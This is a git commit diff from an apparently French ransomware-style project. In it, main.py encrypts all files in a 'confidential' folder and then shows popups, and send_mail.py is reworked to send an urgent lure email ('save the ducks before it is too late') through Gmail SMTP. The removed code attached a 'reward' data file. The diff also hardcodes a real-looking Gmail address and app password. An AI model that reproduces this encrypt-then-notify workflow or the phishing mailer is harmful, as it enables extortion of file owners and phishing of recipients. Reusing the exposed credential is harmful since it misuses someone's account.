dbf00fb5e20a5179f981aeba79824459a8352870
Epiniac <jacqueschen92@gmail.com>
2024-12-20 01:54:14 +0100

    main.py done

--- func/main.py
+++ func/main.py
@@ -1,10 +1,9 @@
 from encrypt import encrypt_main as encrypt
-# from decrypt import decrypt_main as decrypt
-# from send_mail import *
-# from send_popup import *
+from send_popup import show_popup
 
 def main():
     encrypt() #Chiffrement de tous les fichiers dans dossier_confidentiel
+    show_popup() #Envoie des popups
 
 if __name__ == "__main__":
     main()
--- func/send_mail.py
+++ func/send_mail.py
@@ -4,45 +4,31 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
+sender_email = "jooemcg77@gmail.com"
+receiver_email = "jeanpierre.polnareff418@gmail.com"
+password = "ebxw fwuh krkb iile" #mot de passe généré unique
 
-def send_mail():
-        
-    sender_email = "jooemcg77@gmail.com"
-    receiver_email = "joe-94240@hotmail.fr"
-    password = "ebxw fwuh krkb iile" #mot de passe généré unique
+def send_mail(receiver):
 
-    subject = "Test d'envoi"
-    body = "Ceci est un simple test d'email."
+    subject = "Urgent - Sauvons les canards avant qu’il ne soit trop tard!"
+
+    with open("mail_body.txt", 'r') as file:
+        body = file.read()
 
     msg = MIMEMultipart()
     msg["From"] = sender_email
-    msg["To"] = receiver_email
+    msg["To"] = receiver
     msg["Subject"] = subject
 
     msg.attach(MIMEText(body, "plain"))
-
-    filename = "./projet/dist/récompense.data" #Piece jointe a importer
-
-    try:
-        with open(filename, "rb") as attachment:
-            part = MIMEBase("application", "octet-stream")
-            part.set_payload(attachment.read())
-
-        encoders.encode_base64(part)
-        part.add_header(
-            "Content-Disposition",
-            f"attachment; filename={filename}",
-        )
-        msg.attach(part)
-    except FileNotFoundError:
-        print(f"Le fichier {filename} est introuvable.")
 
     try:
         with smtplib.SMTP("smtp.gmail.com", 587) as server:
             server.starttls()
             server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, msg.as_string())
+            server.sendmail(sender_email, receiver, msg.as_string())
             print("Email envoyé avec succès.")
     except Exception as e:
         print(f"Une erreur s'est produite : {e}")
         
+send_mail(receiver_email)
